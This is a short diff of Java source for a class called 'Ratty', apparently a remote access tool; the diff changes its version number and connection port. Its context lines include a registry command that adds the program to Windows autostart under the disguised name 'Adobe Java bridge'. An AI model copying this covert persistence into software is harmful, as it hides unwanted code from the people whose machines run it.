@@ -33,7 +33,7 @@ public final class Ratty {
 	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + STARTUP_FOLDER_NAME + File.separator + STARTUP_FILE_NAME;
 	private static final String REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
 	
-	public static final String VERSION = "1.0";
+	public static final String VERSION = "1.1";
 	
 	private Ratty() {
 		//...
@@ -121,10 +121,10 @@ public final class Ratty {
 			
 			if (input == JOptionPane.YES_OPTION) {
 				System.out.println("Server");
-				startServer(23456);
+				startServer(56673);
 			} else if (input == JOptionPane.NO_OPTION) {
 				System.out.println("Client");
-				connectToHost("localhost", 23456);
+				connectToHost("localhost", 56673);
 			}
 		} else if (client) {
 			addToStartup();
